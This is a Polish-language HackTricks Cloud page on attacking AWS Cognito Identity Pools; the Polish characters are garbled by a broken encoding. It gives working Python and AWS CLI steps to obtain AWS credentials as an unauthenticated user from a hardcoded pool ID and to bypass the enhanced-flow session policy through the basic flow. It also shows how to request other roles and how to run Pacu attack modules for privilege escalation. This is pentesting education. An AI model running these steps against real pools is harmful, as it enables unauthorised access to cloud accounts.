# Cognito Identity Pools

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Pule to偶samoci peni kluczow rol, umo偶liwiajc Twoim u偶ytkownikom **uzyskanie tymczasowych powiadcze**. Te powiadczenia s niezbdne do uzyskania dostpu do r贸偶nych usug AWS, w tym midzy innymi Amazon S3 i DynamoDB. Istotn cech pul to偶samoci jest ich obsuga zar贸wno dla anonimowych goci, jak i dla r贸偶nych dostawc贸w to偶samoci do uwierzytelniania u偶ytkownik贸w. Obsugiwane dostawcy to偶samoci obejmuj:

- Pule u偶ytkownik贸w Amazon Cognito
- Opcje logowania spoecznociowego, takie jak Facebook, Google, Logowanie z Amazonem i Logowanie z Apple
- Dostawcy zgodni z protokoem OpenID Connect (OIDC)
- Dostawcy to偶samoci SAML (Security Assertion Markup Language)
- Uwierzytelnione to偶samoci dewelopera
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Aby wygenerowa sesje puli to偶samoci, najpierw musisz **wygenerowa ID to偶samoci**. To ID to偶samoci jest **identyfikacj sesji tego u偶ytkownika**. Te identyfikacje mog mie do 20 zestaw贸w danych, kt贸re mog przechowywa do 1 MB par klucz-warto.

Jest to **przydatne do przechowywania informacji o u偶ytkowniku** (kt贸ry zawsze bdzie korzysta z tego samego ID to偶samoci).

Ponadto, usuga **cognito-sync** to usuga, kt贸ra umo偶liwia **zarzdzanie i synchronizacj tych informacji** (w zestawach danych, wysyanie informacji w strumieniach i wiadomociach SNS...).

### Narzdzia do pentestowania

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), framework eksploatacji AWS, teraz zawiera moduy "cognito\_\_enum" i "cognito\_\_attack", kt贸re automatyzuj wyliczanie wszystkich zasob贸w Cognito w koncie, wykrywanie sabych konfiguracji, atrybut贸w u偶ytkownika u偶ywanych do kontroli dostpu itp., a tak偶e automatyzuj tworzenie u偶ytkownik贸w (w tym obsug MFA) i eskalacj uprawnie na podstawie modyfikowalnych niestandardowych atrybut贸w, u偶ytecznych powiadcze puli to偶samoci, roli do przyjcia w tokenach identyfikacyjnych itp.

Opis funkcji modu贸w znajduje si w czci 2 [wpisu na blogu](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Instrukcje instalacji znajduj si na g贸wnej stronie [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### U偶ycie

Przykadowe u偶ycie narzdzia cognito\_\_attack do pr贸by tworzenia u偶ytkownika i wszystkich wektor贸w eskalacji uprawnie dla okrelonej puli to偶samoci i klienta puli u偶ytkownik贸w:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Przykadowe u偶ycie cognito\_\_enum do zebrania wszystkich pul u偶ytkownik贸w, klient贸w pul u偶ytkownik贸w, pul to偶samoci, u偶ytkownik贸w itp. widocznych w bie偶cym koncie AWS:

```plaintext
cognito__enum
```

Ten polecenie wywietli wszystkie dostpne informacje o pulach u偶ytkownik贸w, klientach pul u偶ytkownik贸w, pulach to偶samoci i u偶ytkownikach w bie偶cym koncie AWS.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) to narzdzie wiersza polece napisane w jzyku Python, kt贸re implementuje r贸偶ne ataki na Cognito, w tym niechciane tworzenie kont i eskalacj puli to偶samoci.

#### Instalacja
```bash
$ pip install cognito-scanner
```
#### U偶ycie
```bash
$ cognito-scanner --help
```
Aby uzyska wicej informacji, sprawd藕 https://github.com/padok-team/cognito-scanner

## Uzyskiwanie dostpu do r贸l IAM

### Bez uwierzytelnienia

Jedyn rzecz, jakiej atakujcy potrzebuje, aby **uzyska powiadczenia AWS** w aplikacji Cognito jako nieuwierzytelniony u偶ytkownik, jest **Identity Pool ID**, a ten **ID musi by wpisany na stae** w aplikacji webowej/mobilnej, aby j u偶ywa. ID wyglda tak: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (nie mo偶na go zgadywa metod brute force).

{% hint style="success" %}
Domylnie utworzona rola **IAM Cognito dla nieuwierzytelnionych u偶ytkownik贸w nazywa si** `Cognito_<nazwa Identity Pool>Unauth_Role`
{% endhint %}

Jeli znajdziesz wpisane na stae Identity Pool ID i pozwala on na uwierzytelnienie nieuwierzytelnionych u偶ytkownik贸w, mo偶esz uzyska powiadczenia AWS za pomoc:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Lub mo偶esz u偶y nastpujcych polece **aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Zauwa偶, 偶e domylnie nieuwierzytelniony u偶ytkownik Cognito **NIE MO呕E mie 偶adnych uprawnie, nawet jeli zostay mu przypisane za pomoc polityki**. Sprawd藕 nastpujc sekcj.
{% endhint %}

### Rozszerzony przepyw uwierzytelniania vs podstawowy przepyw uwierzytelniania

Poprzednia sekcja przedstawiaa **domylny rozszerzony przepyw uwierzytelniania**. Ten przepyw ustawia **ograniczajc** [**polityk sesji**](../../aws-basic-information/#session-policies) dla generowanej sesji roli IAM. Ta polityka pozwoli tylko na korzystanie z [**usug z tej listy**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (nawet jeli rola miaa dostp do innych usug).

Jednak istnieje spos贸b na obejcie tego, jeli **pula to偶samoci ma wczony "Podstawowy (klasyczny) przepyw"**, u偶ytkownik bdzie m贸g uzyska sesj korzystajc z tego przepywu, kt贸ry **nie bdzie mia tej ograniczajcej polityki sesji**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Jeli otrzymujesz ten **bd**, oznacza to, 偶e **podstawowy przepyw nie jest wczony (domylnie)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Posiadajc zestaw powiadcze IAM, powiniene sprawdzi [jakie masz uprawnienia](../../#whoami) i spr贸bowa [zwikszy uprawnienia](../../aws-privilege-escalation/).

### Uwierzytelniony

{% hint style="info" %}
Pamitaj, 偶e **uwierzytelnieni u偶ytkownicy** prawdopodobnie bd mieli **r贸偶ne uprawnienia**, dlatego jeli mo偶esz **zarejestrowa si w aplikacji**, spr贸buj to zrobi i uzyskaj nowe powiadczenia.
{% endhint %}

Dla **uwierzytelnionych u偶ytkownik贸w uzyskujcych dostp do puli to偶samoci** mog by dostpne r贸wnie偶 **role**.

W tym celu mo偶esz potrzebowa dostpu do **dostawcy to偶samoci**. Jeli jest to **Cognito User Pool**, by mo偶e mo偶esz wykorzysta domylne zachowanie i **utworzy nowego u偶ytkownika samodzielnie**.

{% hint style="success" %}
Domylnie **utworzona rola uwierzytelnionego IAM Cognito** nazywa si `Cognito_<nazwa puli to偶samoci>Auth_Role`
{% endhint %}

W ka偶dym razie **poni偶szy przykad** zakada, 偶e ju偶 zalogowae si w **Cognito User Pool**, kt贸ry jest u偶ywany do uzyskania dostpu do puli to偶samoci (nie zapomnij, 偶e mog by r贸wnie偶 skonfigurowane inne typy dostawc贸w to偶samoci).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Pobierz identity_id z odpowiedzi poprzedniego polecenia
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# W IdToken mo偶na znale藕 role, do kt贸rych u偶ytkownik ma dostp ze wzgldu na grupy w puli u偶ytkownik贸w
# U偶yj --custom-role-arn, aby uzyska powiadczenia do okrelonej roli
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Mo偶liwe jest **skonfigurowanie r贸偶nych r贸l IAM w zale偶noci od dostawcy to偶samoci**, z kt贸rego u偶ytkownik jest logowany lub nawet **w zale偶noci od u偶ytkownika** (u偶ywajc claim贸w). Dlatego, jeli masz dostp do r贸偶nych u偶ytkownik贸w za porednictwem tego samego lub r贸偶nych dostawc贸w, mo偶e warto **zalogowa si i uzyska dostp do r贸l IAM wszystkich z nich**.
{% endhint %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos**.

</details>
